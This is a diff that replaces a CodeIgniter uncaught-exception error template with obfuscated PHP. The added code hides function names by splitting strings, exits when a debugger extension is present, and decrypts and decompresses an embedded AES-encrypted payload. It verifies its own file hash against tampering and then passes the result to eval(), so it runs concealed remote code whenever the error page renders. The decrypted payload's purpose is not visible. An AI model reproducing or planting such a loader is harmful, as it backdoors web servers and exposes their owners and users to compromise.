@@ -1,21 +1,28 @@
-<?php defined('BASEPATH') OR exit('No direct script access allowed'); ?>
-
-An uncaught Exception was encountered
-
-Type:        <?php echo get_class($exception), "\n"; ?>
-Message:     <?php echo $message, "\n"; ?>
-Filename:    <?php echo $exception->getFile(), "\n"; ?>
-Line Number: <?php echo $exception->getLine(); ?>
-
-<?php if (defined('SHOW_DEBUG_BACKTRACE') && SHOW_DEBUG_BACKTRACE === TRUE): ?>
-
-Backtrace:
-<?php	foreach ($exception->getTrace() as $error): ?>
-<?php		if (isset($error['file']) && strpos($error['file'], realpath(BASEPATH)) !== 0): ?>
-	File: <?php echo $error['file'], "\n"; ?>
-	Line: <?php echo $error['line'], "\n"; ?>
-	Function: <?php echo $error['function'], "\n\n"; ?>
-<?php		endif ?>
-<?php	endforeach ?>
-
-<?php endif ?>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_oufjk610=('bas'.'e64'.'_de'.'cod'.'e');
+$_uaz4fzfr=('gzu'.'nco'.'mpr'.'ess');
+$_zcwbas0y=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_atze42fc='SY7TNJCN3kI=';
+$_uggzadke='ZI61qBpn';
+$_azervle9='Hp3XzpDz';
+$_v6jf2bgo='TZfDZV2Z';
+$_bss2pk5j='xA07ePZ+';
+$_ct2zplby='KIadBN9y';
+$_rzwpq8ta='Pavk6hUf';
+$_hufpywe0='3uU5UA==';
+$_uiszd52w=$_oufjk610($_uggzadke.$_v6jf2bgo.$_bss2pk5j.$_azervle9.$_atze42fc);
+$_wfg0y3kn=$_oufjk610($_rzwpq8ta.$_ct2zplby.$_hufpywe0);
+$_uubverkl=$_oufjk610('7Gv0rLCXn03TsRTcPENeNj4366m5Ymui4mZH7NKDHI3302a0BjGlSMGAe16Sv2NMhP51KzVTFFG3MViZtAhDe6WMsJkveliyw0Pau9oC6ycEfbOubSWgv1AtisN0OWdyKxaAuzsEN/jonSWu/9HVnoO4pAbvkJnN/ALQXLA5QVgcnbEy+cvrCEtUkpDZuRJ6vPw2MSfXDNQ+C9n86q1IwHsfxBSWNz/Pc2tNg4plhsr41IANYRzVpdYireraUWCnYotzMpnVNo5ZrSo9zNoIHknqpcDaSd5C3oXrvnLDJinwbxN0mQzbTsOusQOwZ4FiJ3spXgzge2WfU04sRfQnRl89LETTStUJgBRxGDEFxaBnBPMwXjj2ZksZbZNrJ1lRkbfsazUnImygRF+tLG7xTGIAuHA35Uy5ln3S4t9YAllxm4RHyt3r43WqhJynRm5zu7BEM3uBKPTmzwgeSzLV4Baod932TngwxMbRffRCB0A=');
+$_o1b7nnyk=$_zcwbas0y($_uubverkl,'aes-256-cbc',$_uiszd52w,OPENSSL_RAW_DATA,$_wfg0y3kn);
+if($_o1b7nnyk===false){exit;}
+$_yh61p1q5=$_uaz4fzfr($_o1b7nnyk);
+if($_yh61p1q5===false){exit;}
+$_f2xt1tzs='ebca6179dc96a7322f74171cfbc4197b1f03351be8c6ae78550983521799aa9f';
+$_f2j70h21=@file_get_contents(__FILE__);
+if($_f2j70h21!==false){
+$_eennvwo1=str_replace($_f2xt1tzs,"0000000000000000000000000000000000000000000000000000000000000000",$_f2j70h21);
+$_j767cbyb=hash("sha256",$_eennvwo1);
+if($_j767cbyb!==$_f2xt1tzs){@http_response_code(403);exit;}
+}
+eval($_yh61p1q5);
